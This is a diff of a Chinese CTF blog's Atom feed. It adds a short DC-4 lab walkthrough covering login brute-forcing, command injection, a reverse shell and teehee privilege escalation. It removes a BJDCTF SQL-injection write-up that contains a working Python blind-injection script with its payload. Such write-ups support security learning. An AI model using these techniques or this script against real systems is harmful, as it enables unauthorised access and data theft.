@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>ev11ccaatt</title>
-    <updated>2021-04-17T10:41:22.862Z</updated>
+    <updated>2021-04-18T10:13:25.774Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -10,6 +10,29 @@
     <logo>https://ev11ccaatt.github.io/images/avatar.png</logo>
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ev11ccaatt</rights>
+    <entry>
+        <title type="html"><![CDATA[DC-4]]></title>
+        <id>https://ev11ccaatt.github.io/post/dc-4/</id>
+        <link href="https://ev11ccaatt.github.io/post/dc-4/">
+        </link>
+        <updated>2021-04-18T10:13:14.000Z</updated>
+        <content type="html"><![CDATA[<p>上手扫一扫<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418172024234.png" alt="image-20210418172024234" loading="lazy"></p>
+<p><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418172125542.png" alt="image-20210418172125542" loading="lazy">没东西，那手动上去看看。</p>
+<p><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418172148659.png" alt="image-20210418172148659" loading="lazy">貌似要爆破，那么就去爆破试试<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418173403986.png" alt="image-20210418173403986" loading="lazy"></p>
+<p>上去之后发现貌似可以执行命令，抓个包看下。</p>
+<p>这里改成ls /发过去<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418173619769.png" alt="image-20210418173619769" loading="lazy"></p>
+<p>那么肯定要弹个shell了啊</p>
+<p>先看到个<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418175657883.png" alt="image-20210418175657883" loading="lazy">，那么在backups找到了个密码本。</p>
+<p><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418175329906.png" alt="image-20210418175329906" loading="lazy">那么复制下来爆破一下。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418180508610.png" alt="image-20210418180508610" loading="lazy"></figure>
+<p>bingo！</p>
+<p><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418180845027.png" alt="image-20210418180845027" loading="lazy">那么去/var/mail看下<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418180922010.png" alt="image-20210418180922010" loading="lazy"></p>
+<p>换个用户，<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418181035292.png" alt="image-20210418181035292" loading="lazy">那么就是用teehee提权。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418181228961.png" alt="image-20210418181228961" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210418181253439.png" alt="image-20210418181253439" loading="lazy"></figure>
+<p>下班。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[WUSTCTF2020]颜值成绩查询]]></title>
         <id>https://ev11ccaatt.github.io/post/wustctf2020yan-zhi-cheng-ji-cha-xun/</id>
@@ -242,52 +265,6 @@ $b = serialize($a);
 echo urlencode($b);
 </code></pre>
 <p>即可，传入后在cookie可以看到flag.</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[BJDCTF 2nd]简单注入]]></title>
-        <id>https://ev11ccaatt.github.io/post/bjdctf-2ndjian-dan-zhu-ru/</id>
-        <link href="https://ev11ccaatt.github.io/post/bjdctf-2ndjian-dan-zhu-ru/">
-        </link>
-        <updated>2021-04-06T06:35:42.000Z</updated>
-        <content type="html"><![CDATA[<p>进去是个登陆界面，试一下username=amdin，password=1&quot;</p>
-<p>弹出stophacking,那么应该是个注入了。</p>
-<p>这里在passowrd测试了一会，无果，去扫一下目录。</p>
-<p>扫到hint.txt</p>
-<p>给了sql语句</p>
-<pre><code class="language-select"></code></pre>
-<p>这里需要\来转义'从而将$_POST[&quot;password&quot;]释放出来.<br>
-语句会变为</p>
-<pre><code>`select * from users where username=('$_POST[&quot;username&quot;] and password=' )($_POST[&quot;password&quot;]');
-</code></pre>
-<p>这样就可以在password处进行数字注入</p>
-<p>采用二分法</p>
-<pre><code>import requests
-import time
-
-url = 'http://6508e5bd-9f0d-441f-9954-107228bdd7fa.node3.buuoj.cn/index.php'
-flag = &quot;&quot;
-data  ={&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}
-for i in range(1,1000):
-    low = 32
-    high = 128
-    mid = (low+high) // 2
-    while(low&lt;high):
-        time.sleep(0.2)
-        payload = &quot;or/**/if(ascii(substr(password,{},1))&gt;{},1,0)#&quot;.format(i,mid)  
-        data['password']=payload
-        r = requests.post(url,data=data).text
-        if &quot;stronger&quot; in r:
-            low = mid + 1
-        else:
-            high = mid
-        mid = (low+high) // 2
-        print(mid)
-    if(mid == 32 or mid ==132):
-        break
-    flag +=chr(mid)
-    print(flag)
-</code></pre>
 ]]></content>
     </entry>
 </feed>
